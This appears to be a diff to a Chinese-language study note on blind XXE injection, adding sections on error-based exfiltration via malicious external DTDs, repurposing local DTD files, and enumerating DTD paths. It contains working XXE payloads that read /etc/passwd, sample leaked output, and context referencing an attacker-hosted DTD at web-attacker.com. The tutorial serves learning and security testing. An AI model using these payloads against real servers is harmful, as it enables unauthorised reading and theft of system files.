@@ -127,13 +127,13 @@ XXE盲注仍然可以被检测和利用，但需要更先进的技术。有时�
 
 此XXE攻击会导致服务器向指定的URL发出后端HTTP请求。攻击者可以监视生成的**DNS查找和HTTP请求**，从而检测XXE攻击是否成功。
 
-有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些加固，使用常规实体的 XXE 攻击会被阻止。在这种情况下，你也许可以使用 XML 参数实体来代替。XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需了解两件事。首先，XML 参数实体的声明包括实体名称前的百分号字符：
+有时，由于应用程序的某些输入验证或正在使用的 XML 解析器的某些加固，使用常规实体的 XXE 攻击会被阻止。在这种情况下，你也许可以使用 XML **参数实体**来代替。XML 参数实体是一种特殊的 XML 实体，只能在 DTD 的其他地方引用。就目前而言，您只需了解两件事。首先，XML 参数实体的声明包括实体名称前**的百分号字符**：
 
 ```xml-dtd
 <!ENTITY % myparameterentity "my parameter entity value" >
 ```
 
-其次，使用百分号字符而不是通常的&符号来引用参数实体：
+其次，**使用百分号字符**而不是通常的&符号**来引用**参数实体：
 
 ```xml-dtd
 %myparameterentity;
@@ -152,6 +152,8 @@ XXE盲注仍然可以被检测和利用，但需要更先进的技术。有时�
 通过out-of-band技术检测 XXE盲注漏洞效果很好，但实际上并没有演示如何利用该漏洞。攻击者真正想要实现的是泄露敏感数据。这可以通过XXE盲注漏洞来实现！但它涉及攻击者在他们控制的系统上托管恶意DTD，然后从带内XXE有效负载中调用外部DTD。
 
 恶意DTD泄露 /etc/passwd 文件内容的示例如下：
+
+>实体编码是以&#开头 ；结尾的
 
 ```xml-dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
@@ -184,11 +186,86 @@ http://web-attacker.com/malicious.dtd
 
 >此方法可能不适用于某些文件内容，包括 `/etc/passwd` 文件中包含的换行符。这是因为某些 XML 分析器使用 API 提取外部实体定义中的 URL，该 API 验证允许在 URL 中显示的字符。在这种情况下，可以使用 FTP 协议而不是 HTTP。有时，无法泄露包含换行符的数据，因此可以改为以 等 `/etc/hostname` 文件为目标。
 
+### Exploiting blind XXE to retrieve data via error messages
+
+利用XXE盲注的另一种方法是触发XML解析错误，其中**错误信息包含要检索的敏感数据**。如果应用程序在其响应中返回生成的错误消息，这将生效。
+
+可以使用恶意外部DTD触发包含`/etc/passwd` 文件内容的XML解析错误消息
+
+```xml-dtd
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+```
+
+此DTD执行以下步骤：
+
+- 定义一个名为file的XML参数实体，其中包含`/etc/passwd`文件的内容。
+- 定义一个名为eval的XML参数实体，其中包含另一个名为`error`的XML参数实体的动态声明。将通过加载一个不存在的文件来评估该实体，该文件的名称包含该`error` `file`实体的值。
+- 使用实体，这会导致执行eval error实体的动态声明。
+- 使用实体error，以便通过尝试加载不存在的文件来计算其值，从而生成一条错误消息，其中包含不存在的文件名称，即etc/passwd的内容。
+
+调用恶意外部DTD将导致如下所示的错误信息：
+
+```passwd
+java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+```
+
+### Exploiting blind XXE by repurposing a local DTD
+
+上述技术适用于外部 DTD，但通常不适用于 `DOCTYPE` 元素中完全指定的内部 DTD。这是因为该技术涉及在另一个参数实体的定义中使用 XML 参数实体。根据 XML 规范，这在外部 DTD 中是允许的，但在内部 DTD 中是不允许的。 （某些分析器可能允许它，但许多分析器不允许。
+
+那么，当带外交互被阻止时，盲目的 XXE 漏洞又如何呢？无法通过带外连接泄露数据，也无法从远程服务器加载外部 DTD。
+
+在这种情况下，由于 **XML 语言规范中的漏洞**，可能仍可能触发包含敏感数据的错误消息。如果文档的 DTD 混合使用内部和外部 DTD 声明，则内部 DTD 可以重新定义在外部 DTD 中声明的实体。发生这种情况时，将放宽对在另一个参数实体的定义中使用 XML 参数实体的限制。
+
+这意味着攻击者可以从内部 DTD 中使用基于错误的 XXE 技术，前提是他们使用的 XML 参数实体正在重新定义在外部 DTD 中声明的实体。当然，如果带外连接被阻止，则无法从远程位置加载外部 DTD。相反，它需要是应用程序服务器本地的外部 DTD 文件。从本质上讲，该攻击涉及调用恰好存在于本地文件系统上的 DTD 文件，并重新调整其用途以重新定义现有实体，从而触发包含敏感数据的解析错误。该技术由Arseniy Sharoglazov首创，并在我们的2018年十大网络黑客技术中排名#7。
+
+例如，假设服务器文件系统上有一个 DTD 文件 `/usr/local/app/schema.dtd` ，并且此 DTD 文件定义了一个名为 `custom_entity` 的实体。攻击者可以通过提交如下所示的混合 DTD 来触发包含 `/etc/passwd` 文件内容的 XML 分析错误消息：
+
+```xml-dtd
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
+<!ENTITY % custom_entity '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+```
+
+此 DTD 执行以下步骤：
+
+- 定义一个名为 `local_dtd` 的 XML 参数实体，其中包含服务器文件系统上存在的外部 DTD 文件的内容。
+- 重新定义名为 `custom_entity` 的 XML 参数实体，该实体已在外部 DTD 文件中定义。该实体被重新定义为包含已描述的基于错误的 XXE 漏洞，用于触发包含 `/etc/passwd` 文件内容的错误消息。
+- 使用 `local_dtd` 实体，以便解释外部 DTD，包括 `custom_entity` 实体的重新定义值。这将导致所需的错误消息。
+
+### Locating an existing DTD file to repurpose
+
+由于此 XXE 攻击涉及重新利用服务器文件系统上的现有 DTD，因此关键要求是找到合适的文件。这其实很简单。由于应用程序返回 XML 分析器引发的任何错误消息，因此只需尝试从内部 DTD 中加载本地 DTD 文件，即可轻松枚举这些文件。
+
+例如，使用 GNOME 桌面环境的 Linux 系统通常有一个位于 `/usr/share/yelp/dtd/docbookx.dtd` 的 DTD 文件。您可以通过提交以下 XXE 有效负载来测试此文件是否存在，如果文件丢失，这将导致错误：
+
+```xml-dtd
+<!DOCTYPE foo [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+%local_dtd;
+]>
+```
+
+在测试了常见 DTD 文件的列表以查找存在的文件后，您需要获取该文件的副本并查看它以查找可以重新定义的实体。由于许多包含 DTD 文件的常见系统都是开源的，因此您通常可以通过 Internet 搜索快速获取文件的副本。
+
 ### Finding hidden attack surface for XXE injection
 
 XXE 注入漏洞的攻击面在很多情况下是显而易见的，因为应用程序的正常 HTTP 流量包括包含 XML 格式数据的请求。在其他情况下，攻击面则不那么明显。不过，只要找对地方，就能在不包含任何 XML 的请求中发现 XXE 攻击面。
 
-**某些应用程序接收客户端提交的数据，将其嵌入到服务器端的XML文档中**，然后分析该文档。例如，将客户端提交的数据放入后端SOAP请求中，然后胡由后端SOAP服务处理该请求。
+**某些应用程序接收客户端提交的数据，将其嵌入到服务器端的XML文档中**，然后分析该文档。例如，将客户端提交的数据放入后端SOAP请求中，然后由后端SOAP服务处理该请求。
 
 在这种情况下，无法执行经典的XXE攻击，因为无法控制整个XML文档，因此无法定义或修改元素`DOCTYPE`。但是，您也许可以改用`XInclude`。`XInclude`是XML规范的一部分，它允许从子文档构建XML文档。可以在XML文档中的任何数据值中发起攻击，因此，在仅控制放置在服务器端XML文档中的单个数据项的情况下，可以执行该`XInclude`攻击。‘
 
@@ -211,7 +288,7 @@ XXE 注入漏洞的攻击面在很多情况下是显而易见的，因为应用�
 
 ### XXE attacks via modified content type
 
-大多数POST请求使用由HTML表单生成的默认内容类型，例如`application/x-www-form-urlencoded` 。某些网站希望以这种格式接收请求，但会容忍其他内容类型，包括XML。
+大多数POST请求使用由HTML表单生成的默认内容类型，例如`application/x-www-form-urlencoded` 。某些网站希望以这种格式接收请求，**但会容忍其他内容类型**，包括XML。
 
 例如，如果普通请求包含以下内容
 
